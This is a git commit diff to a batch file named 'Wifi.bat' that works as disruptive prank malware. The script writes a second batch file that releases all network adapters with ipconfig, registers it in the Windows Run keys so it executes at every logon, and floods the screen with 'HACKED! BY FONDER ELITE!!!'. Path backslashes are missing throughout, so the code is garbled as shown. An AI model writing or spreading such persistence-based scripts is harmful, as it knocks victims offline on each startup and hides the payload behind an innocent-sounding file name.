c0bc1a192dd691adb453fdebfa30f89c6f833f2c
FonderElite <71190959+FonderElite@users.noreply.github.com>
2020-12-27 20:53:08 +0800

    Update Wifi.bat

--- Wifi.bat
+++ Wifi.bat
@@ -3,5 +3,7 @@ echo break off>c:windowswimn32.bat echo
 ipconfig/release_all>c:windowswimn32.bat
 echo end>c:windowswimn32.batreg add
 hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /freg add
-hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho You Have Been HACKED!
+hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat
+color 04
+for /L %%n in (3,3,2000)do echo HACKED! BY FONDER ELITE!!!
 PAUSE
